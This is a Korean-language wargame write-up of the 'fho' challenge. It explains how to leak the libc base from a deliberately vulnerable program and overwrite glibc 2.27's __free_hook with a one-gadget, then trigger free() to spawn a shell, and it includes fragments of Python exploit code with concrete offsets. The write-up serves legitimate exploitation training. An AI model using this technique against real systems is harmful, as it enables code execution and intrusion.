# fho (`__free_hook` overwrite)

임의 주소 쓰기(AAW)로 glibc의 `__free_hook`을 **one-gadget**으로 덮고, `free`를 트리거해 셸을 얻는다.

## 대상 코드

```c
int main() {
  char buf[0x30];
  unsigned long long *addr, value;
  ...
  // [1] Stack BOF + 릭
  read(0, buf, 0x100);
  printf("Buf: %s\n", buf);

  // [2] Arbitrary-Address-Write
  scanf("%llu", &addr);
  scanf("%llu", &value);
  *addr = value;            // 임의 주소에 임의 값 쓰기

  // [3] Arbitrary-Address-Free
  scanf("%llu", &addr);
  free(addr);              // 임의 주소 free → __free_hook 트리거
}
```

- libc: 2.27 (`__free_hook` 존재).
- 프로그램이 **AAW**와 **임의 free**를 그대로 제공한다.

## `__free_hook` 이란

glibc의 `free()`는 진입 시 전역 함수 포인터 `__free_hook`이 설정되어 있으면 원래 free 대신 그 함수를 `hook(ptr, caller)` 형태로 호출한다. 디버깅 훅이지만, 값을 덮을 수 있으면 `free(x)` 한 번으로 임의 코드를 실행하는 강력한 익스 포인트가 된다.

## 익스플로잇 원리

### 1단계 — libc base 릭
`buf`(0x30)를 넘겨 스택에 남아 있는 `__libc_start_main+231` 리턴 주소를 `%s`로 함께 출력시킨다. `read`는 널바이트를 넣지 않으므로 이어진 주소까지 노출된다.

```python
buf = b'A' * 0x48
libc_start_main_xx = u64(leak)
libc_base = libc_start_main_xx - (libc.symbols['__libc_start_main'] + 231)
```

### 2단계 — free hook 덮기
AAW로 `__free_hook = one_gadget`.

```python
free_hook = libc_base + libc.symbols['__free_hook']
og        = libc_base + 0x4f432   # one_gadget (execve("/bin/sh"))
# *free_hook = og
```

### 3단계 — 트리거
아무 주소나 `free()` → `__free_hook`(=one-gadget)이 실행되어 셸.

## 핵심 개념

- **one-gadget**: libc 내에서 특정 레지스터/스택 조건만 맞으면 바로 `execve("/bin/sh", ...)`가 되는 단일 주소. 조건이 안 맞으면 다른 후보를 시도한다.
- `free`가 호출되는 시점의 레지스터 상태가 one-gadget 제약을 만족해야 한다.
- glibc **2.34부터 `__free_hook`/`__malloc_hook`이 제거**되어 이 기법은 구버전 한정.
